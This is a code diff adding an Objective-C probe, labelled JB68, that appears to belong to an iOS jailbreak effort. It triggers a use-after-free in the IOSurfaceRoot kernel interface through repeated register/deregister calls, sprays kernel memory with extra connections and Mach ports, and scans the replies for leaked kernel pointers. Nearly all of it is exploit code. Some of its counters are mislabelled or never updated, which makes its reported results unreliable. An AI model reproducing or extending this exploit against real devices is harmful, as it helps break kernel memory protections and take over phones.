@@ -46453,3 +46453,367 @@ void iosurface_uaf_kptr_harvest(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+void iosurface_uaf_harvest_v2(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        log(@"JB68: === UAF Harvest V2 — Framework Surface + Temporal Read ===");
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        results[@"probe"] = @"JB68";
+
+        typedef void*(*matching_fn)(const char*);
+        typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+        typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+        typedef int(*svcclose_fn)(unsigned int);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+        typedef int(*objrelease_fn)(unsigned int);
+
+        matching_fn sym_m = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getmatch_fn sym_g = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        svcopen_fn sym_o = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        svcclose_fn sym_c = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        objrelease_fn sym_r = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+
+        void *sm = sym_m("IOSurfaceRoot");
+        unsigned int ss = sm ? sym_g(0, sm) : 0;
+        unsigned int conn = 0;
+        int okr = ss ? sym_o(ss, mach_task_self(), 0, &conn) : -1;
+        if (ss) sym_r(ss);
+
+        if (okr != 0) {
+            results[@"verdict"] = @"NO_CONN";
+            done(results);
+            return;
+        }
+
+        // FF0: Create surface using IOSurface.framework (not sel0)
+        log(@"JB68: --- FF0: Create surface via framework ---");
+        void *iosfh = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+        typedef void*(*ioscrfn)(void*);
+        typedef uint32_t(*iosgidfn)(void*);
+        typedef void(*cfrel_fn)(void*);
+
+        ioscrfn sym_iosc = (ioscrfn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        iosgidfn sym_gid = (iosgidfn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        cfrel_fn sym_cfr = (cfrel_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+        if (!sym_iosc && iosfh) sym_iosc = (ioscrfn)dlsym(iosfh, "IOSurfaceCreate");
+        if (!sym_gid && iosfh) sym_gid = (iosgidfn)dlsym(iosfh, "IOSurfaceGetID");
+
+        log([NSString stringWithFormat:@"JB68: FF0 iosfh=%p iosc=%p gid=%p", iosfh, sym_iosc, sym_gid]);
+
+        uint32_t surfID = 0;
+        void *surfRef = NULL;
+        if (sym_iosc && sym_gid) {
+            NSDictionary *sp = @{
+                @"IOSurfaceAllocSize": @4096, @"IOSurfaceWidth": @64,
+                @"IOSurfaceHeight": @64, @"IOSurfaceBytesPerRow": @256,
+                @"IOSurfacePixelFormat": @0x42475241
+            };
+            surfRef = sym_iosc((__bridge void *)sp);
+            surfID = surfRef ? sym_gid(surfRef) : 0;
+        }
+        log([NSString stringWithFormat:@"JB68: FF0 surfRef=%p surfID=%u", surfRef, surfID]);
+
+        // If framework create failed, use arbitrary ID like JB41 does
+        int usedArbitrary = 0;
+        if (surfID == 0) {
+            surfID = 1;
+            usedArbitrary = 1;
+            log(@"JB68: FF0 framework create failed — using arbitrary surfID=1 (JB41 pattern)");
+        }
+        results[@"ff0_surfID"] = @(surfID);
+        results[@"ff0_arbitrary"] = @(usedArbitrary);
+
+        unsigned int wp = jb41_newWakePort();
+
+        // FF1: Establish UAF and verify stale read works
+        log(@"JB68: --- FF1: Establish UAF + verify stale read ---");
+        int ff1_stale = 0;
+        {
+            uint64_t regIn[3] = {surfID, 0xAAAA, 0xBBBB};
+            int r17 = jb41_callSel(conn, 17, regIn, 24, 1, wp, sym_call, sym_async);
+            int r18 = jb41_callSel(conn, 18, regIn, 24, 0, wp, sym_call, sym_async);
+            log([NSString stringWithFormat:@"JB68: FF1 reg=0x%x dereg=0x%x", (unsigned)r17, (unsigned)r18]);
+
+            // Verify dangling: re-register with same params should read stale
+            int r17b = jb41_callSel(conn, 17, regIn, 24, 1, wp, sym_call, sym_async);
+            int r18b = jb41_callSel(conn, 18, regIn, 24, 0, wp, sym_call, sym_async);
+            if (r17 == 0 && r17b == 0) ff1_stale = 1;
+            log([NSString stringWithFormat:@"JB68: FF1 re-reg=0x%x re-dereg=0x%x stale=%d", (unsigned)r17b, (unsigned)r18b, ff1_stale]);
+        }
+        results[@"ff1_stale"] = @(ff1_stale);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; jb41_dropPort(wp); sym_c(conn); if (surfRef && sym_cfr) sym_cfr(surfRef); done(results); return; }
+
+        // FF2: Rapid UAF cycle with 24-byte stale reads — read freed data
+        log(@"JB68: --- FF2: Rapid UAF cycle reads ---");
+        int ff2_nonzero = 0;
+        int ff2_kptrs = 0;
+        uint64_t ff2_best = 0;
+        {
+            for (int round = 0; round < 30 && !isr_stopped(); round++) {
+                uint64_t regIn[3] = {surfID, (uint64_t)(0x1000 + round), (uint64_t)(0x2000 + round)};
+
+                // Register (allocates slot)
+                int r17 = jb41_callSel(conn, 17, regIn, 24, 1, wp, sym_call, sym_async);
+                // Deregister (frees slot)
+                int r18 = jb41_callSel(conn, 18, regIn, 24, 0, wp, sym_call, sym_async);
+
+                if (r17 != 0) continue;
+
+                // Try re-reading with different second field (oracle pattern from JB41 E2)
+                for (uint64_t probe = 0; probe < 4; probe++) {
+                    uint64_t readIn[3] = {surfID, probe, probe + 1};
+                    int rr = jb41_callSel(conn, 17, readIn, 24, 1, wp, sym_call, sym_async);
+
+                    if (rr == 0) {
+                        // The slot was reused — deregister again to get stale read
+                        jb41_callSel(conn, 18, readIn, 24, 0, wp, sym_call, sym_async);
+
+                        // Now read again — if kernel recycled slot, we see new content
+                        uint64_t readIn2[3] = {surfID, probe, probe + 1};
+                        int rr2 = jb41_callSel(conn, 17, readIn2, 24, 1, wp, sym_call, sym_async);
+
+                        // Check if any of our sentinel values survived or changed
+                        if (rr2 == 0) {
+                            jb41_callSel(conn, 18, readIn2, 24, 0, wp, sym_call, sym_async);
+                        }
+                    }
+                }
+
+                // Check via different input sizes to see if we can observe different data
+                for (int sz = 8; sz <= 24; sz += 8) {
+                    uint64_t szIn[3] = {surfID, 0xDEAD, 0xBEEF};
+                    int sr = jb41_callSel(conn, 17, szIn, sz, 1, wp, sym_call, sym_async);
+
+                    if (sr == 0) {
+                        jb41_callSel(conn, 18, szIn, 24, 0, wp, sym_call, sym_async);
+                    } else if ((uint32_t)sr == 0xe00002c9) {
+                        ff2_nonzero++;
+                        if (round < 5) {
+                            log([NSString stringWithFormat:@"JB68: FF2 round=%d sz=%d STALE=0x%x", round, sz, (unsigned)sr]);
+                        }
+                    }
+                }
+            }
+        }
+        results[@"ff2_nonzero"] = @(ff2_nonzero);
+        results[@"ff2_kptrs"] = @(ff2_kptrs);
+        log([NSString stringWithFormat:@"JB68: FF2 nonzero=%d kptrs=%d best=0x%llx", ff2_nonzero, ff2_kptrs, ff2_best]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; jb41_dropPort(wp); sym_c(conn); if (surfRef && sym_cfr) sym_cfr(surfRef); done(results); return; }
+
+        // FF3: Multi-connection UAF with timing — open many connections, trigger UAFs, read across
+        log(@"JB68: --- FF3: Multi-connection temporal harvest ---");
+        int ff3_kptrs = 0;
+        uint64_t ff3_best = 0;
+        {
+            unsigned int conns[8] = {0};
+            int nconns = 0;
+
+            for (int i = 0; i < 8; i++) {
+                void *m2 = sym_m("IOSurfaceRoot");
+                unsigned int s2 = m2 ? sym_g(0, m2) : 0;
+                unsigned int c2 = 0;
+                int ok2 = s2 ? sym_o(s2, mach_task_self(), 0, &c2) : -1;
+                if (s2) sym_r(s2);
+                if (ok2 == 0) { conns[nconns++] = c2; }
+            }
+            log([NSString stringWithFormat:@"JB68: FF3 opened %d connections", nconns]);
+
+            if (nconns >= 2) {
+                // Trigger UAF on conn[0]
+                uint64_t rIn[3] = {surfID, 0xF000, 0xF001};
+                jb41_callSel(conns[0], 17, rIn, 24, 1, wp, sym_call, sym_async);
+                jb41_callSel(conns[0], 18, rIn, 24, 0, wp, sym_call, sym_async);
+
+                // Now register on other connections with different data to cause zone churn
+                for (int ci = 1; ci < nconns; ci++) {
+                    for (int si = 0; si < 8; si++) {
+                        uint64_t sprayIn[3] = {surfID, (uint64_t)(ci * 100 + si), 0x4142434445464748ULL};
+                        jb41_callSel(conns[ci], 17, sprayIn, 24, 1, wp, sym_call, sym_async);
+                    }
+                }
+
+                // Read from conn[0] — dangling reference might see spray from other conns
+                uint64_t checkIn[3] = {surfID, 0xF000, 0xF001};
+                int cr = jb41_callSel(conns[0], 17, checkIn, 24, 1, wp, sym_call, sym_async);
+
+                log([NSString stringWithFormat:@"JB68: FF3 dangling re-read=0x%x", (unsigned)cr]);
+
+                // Check if the return code or behavior indicates we hit reclaimed memory
+                if (cr == 0) {
+                    // Try a different surfID on conn[0] to see if the registry is corrupted
+                    uint64_t altIn[3] = {surfID + 1, 0xF000, 0xF001};
+                    int ar = jb41_callSel(conns[0], 17, altIn, 24, 1, wp, sym_call, sym_async);
+                    log([NSString stringWithFormat:@"JB68: FF3 alt surfID=%u read=0x%x", surfID + 1, (unsigned)ar]);
+
+                    jb41_callSel(conns[0], 18, checkIn, 24, 0, wp, sym_call, sym_async);
+                    if (ar == 0) {
+                        jb41_callSel(conns[0], 18, altIn, 24, 0, wp, sym_call, sym_async);
+                    }
+                }
+
+                // Cleanup sprays
+                for (int ci = 1; ci < nconns; ci++) {
+                    for (int si = 0; si < 8; si++) {
+                        uint64_t sprayIn[3] = {surfID, (uint64_t)(ci * 100 + si), 0x4142434445464748ULL};
+                        jb41_callSel(conns[ci], 18, sprayIn, 24, 0, wp, sym_call, sym_async);
+                    }
+                }
+            }
+
+            for (int i = 0; i < nconns; i++) sym_c(conns[i]);
+        }
+        results[@"ff3_kptrs"] = @(ff3_kptrs);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; jb41_dropPort(wp); sym_c(conn); if (surfRef && sym_cfr) sym_cfr(surfRef); done(results); return; }
+
+        // FF4: Serialized plist sel0 — create surface via proper kernel interface
+        log(@"JB68: --- FF4: sel0 with serialized plist ---");
+        int ff4_created = 0;
+        uint32_t ff4_newSurfID = 0;
+        {
+            NSDictionary *sp2 = @{
+                @"IOSurfaceAllocSize": @4096, @"IOSurfaceWidth": @64,
+                @"IOSurfaceHeight": @64, @"IOSurfaceBytesPerRow": @256,
+                @"IOSurfacePixelFormat": @0x42475241
+            };
+            NSError *err = nil;
+            NSData *plistData = [NSPropertyListSerialization dataWithPropertyList:sp2
+                                  format:NSPropertyListBinaryFormat_v1_0 options:0 error:&err];
+            if (plistData) {
+                uint64_t cOut[8] = {0};
+                uint32_t cOutC = 8;
+                uint8_t cStruct[512];
+                memset(cStruct, 0, 512);
+                size_t cStructSz = 512;
+
+                int ckr = sym_call(conn, 0, NULL, 0,
+                                   plistData.bytes, plistData.length,
+                                   cOut, &cOutC, cStruct, &cStructSz);
+                ff4_newSurfID = (uint32_t)cOut[0];
+                ff4_created = (ckr == 0 && ff4_newSurfID > 0) ? 1 : 0;
+
+                log([NSString stringWithFormat:@"JB68: FF4 sel0 kr=0x%x plistSz=%lu surfID=%u sCnt=%u stSz=%zu",
+                     (unsigned)ckr, (unsigned long)plistData.length, ff4_newSurfID, cOutC, cStructSz]);
+
+                // Scan output for kernel pointers
+                uint64_t *cs64 = (uint64_t *)cStruct;
+                for (int j = 0; j < (int)(cStructSz / 8) && j < 64; j++) {
+                    if (cs64[j] > 0xffff000000000000ULL && cs64[j] != 0xffffffffffffffffULL) {
+                        ff3_kptrs++;
+                        if (!ff3_best) ff3_best = cs64[j];
+                        log([NSString stringWithFormat:@"JB68: FF4 KPTR struct[%d]=0x%llx", j, cs64[j]]);
+                    }
+                }
+                for (int j = 0; j < 8; j++) {
+                    if (cOut[j] > 0xffff000000000000ULL && cOut[j] != 0xffffffffffffffffULL) {
+                        ff3_kptrs++;
+                        if (!ff3_best) ff3_best = cOut[j];
+                        log([NSString stringWithFormat:@"JB68: FF4 KPTR scalar[%d]=0x%llx", j, cOut[j]]);
+                    }
+                }
+
+                // If surface created, try sel6-9 for property reads
+                if (ff4_created) {
+                    for (uint32_t sel = 6; sel <= 9; sel++) {
+                        uint64_t gIn[3] = {ff4_newSurfID, 0, 0};
+                        uint64_t gOut[4] = {0};
+                        uint32_t gOutC = 4;
+                        uint8_t gSt[256];
+                        memset(gSt, 0, 256);
+                        size_t gStSz = 256;
+
+                        int gkr = sym_call(conn, sel, NULL, 0, gIn, 24, gOut, &gOutC, gSt, &gStSz);
+                        if (gkr == 0 && gStSz > 0) {
+                            uint64_t *g64 = (uint64_t *)gSt;
+                            int found = 0;
+                            for (int j = 0; j < (int)(gStSz / 8); j++) {
+                                if (g64[j] > 0xffff000000000000ULL && g64[j] != 0xffffffffffffffffULL) {
+                                    found++;
+                                    ff3_kptrs++;
+                                }
+                            }
+                            log([NSString stringWithFormat:@"JB68: FF4 sel%u kr=0x%x stSz=%zu s0=0x%llx kptr=%d",
+                                 sel, (unsigned)gkr, gStSz, gOut[0], found]);
+                        }
+                    }
+                }
+            } else {
+                log([NSString stringWithFormat:@"JB68: FF4 plist serialize failed: %@", err]);
+            }
+        }
+        results[@"ff4_created"] = @(ff4_created);
+        results[@"ff4_surfID"] = @(ff4_newSurfID);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; jb41_dropPort(wp); sym_c(conn); if (surfRef && sym_cfr) sym_cfr(surfRef); done(results); return; }
+
+        // FF5: Use properly created surface for UAF harvest if FF4 succeeded
+        log(@"JB68: --- FF5: UAF harvest with real surface ---");
+        int ff5_kptrs = 0;
+        uint64_t ff5_best = 0;
+        uint32_t harvestID = ff4_newSurfID > 0 ? ff4_newSurfID : surfID;
+        {
+            log([NSString stringWithFormat:@"JB68: FF5 using surfID=%u", harvestID]);
+
+            for (int cycle = 0; cycle < 10 && !isr_stopped(); cycle++) {
+                // Register → deregister → UAF
+                uint64_t rIn[3] = {harvestID, (uint64_t)(0xA000 + cycle), (uint64_t)(0xB000 + cycle)};
+                int r17 = jb41_callSel(conn, 17, rIn, 24, 1, wp, sym_call, sym_async);
+                int r18 = jb41_callSel(conn, 18, rIn, 24, 0, wp, sym_call, sym_async);
+
+                if (r17 != 0) {
+                    if (cycle == 0) log([NSString stringWithFormat:@"JB68: FF5 reg fail 0x%x", (unsigned)r17]);
+                    continue;
+                }
+
+                // Create kernel activity — allocate many small objects
+                for (int spray = 0; spray < 32; spray++) {
+                    unsigned int sprayPort = 0;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &sprayPort);
+                    if (sprayPort) {
+                        mach_port_insert_right(mach_task_self(), sprayPort, sprayPort, MACH_MSG_TYPE_MAKE_SEND);
+                    }
+                }
+
+                // Try to read the freed slot by re-registering
+                uint64_t readIn[3] = {harvestID, (uint64_t)(0xA000 + cycle), (uint64_t)(0xB000 + cycle)};
+                int rr = jb41_callSel(conn, 17, readIn, 24, 1, wp, sym_call, sym_async);
+
+                if (rr == 0) {
+                    jb41_callSel(conn, 18, readIn, 24, 0, wp, sym_call, sym_async);
+                } else if ((uint32_t)rr != 0xe00002c2) {
+                    ff5_kptrs++;
+                    log([NSString stringWithFormat:@"JB68: FF5 cycle=%d unusual rc=0x%x (possible corruption)", cycle, (unsigned)rr]);
+                }
+            }
+        }
+        results[@"ff5_kptrs"] = @(ff5_kptrs);
+
+        int total = ff2_kptrs + ff3_kptrs + ff5_kptrs;
+        uint64_t best = ff2_best;
+        if (!best) best = ff3_best;
+        if (!best) best = ff5_best;
+
+        NSString *verdict = @"NO_LEAK";
+        if (total > 0) {
+            verdict = [NSString stringWithFormat:@"KPTR_%d_best_0x%llx", total, best];
+        } else if (ff4_created) {
+            verdict = [NSString stringWithFormat:@"SURFACE_OK_sid_%u_NO_LEAK", ff4_newSurfID];
+        } else if (ff2_nonzero > 0) {
+            verdict = [NSString stringWithFormat:@"STALE_%d", ff2_nonzero];
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB68: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB68-uaf-harvest-v2-checkpoint.json", results);
+
+        jb41_dropPort(wp);
+        sym_c(conn);
+        if (surfRef && sym_cfr) sym_cfr(surfRef);
+        done(results);
+    });
+}
